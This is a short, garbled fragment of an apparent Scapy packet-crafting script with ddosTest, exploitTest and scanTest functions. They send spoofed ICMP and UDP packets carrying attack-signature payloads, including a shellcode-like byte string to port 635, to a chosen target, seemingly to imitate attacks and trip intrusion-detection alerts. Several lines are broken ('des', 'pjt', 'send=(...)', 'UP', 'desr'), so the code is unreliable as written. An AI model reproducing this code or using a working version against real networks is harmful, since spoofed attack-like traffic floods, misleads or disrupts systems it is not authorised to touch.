...
des ddosTest(src,dst,iface,count):
    pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
    send(pjt,iface=iface,count=count)
...
def exploitTest(src,dst,iface,count):
    ...
    send(pkt,iface=iface,count=count)
    pkt = IP(src=src,dst=dst) / UDP(dport=635)/Raw(load="^\B0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send=(pkt,iface=iface,count=count)
def scanTest(src=dst,iface,count):
    pkt = UP(src=src,dst=dst) / UDP(dport=7)/Raw(load='cybercop')
    send(pkt)
    pkt = IP(src=src,dst=dst) / UDP(dport=10080)/Raw(load='Amanda')
    send(pkt,iface=iface,count=count)
def main():
    parser = optparse.OptionParser('usage%prog'+'-i<face> -s<src> -t <target> -c <count>')
    parser.add_option('-i',dest='iface',type='string',help='specify network interface')
    parser.add_option('-s',desr='src',type='string',help='specify source address')
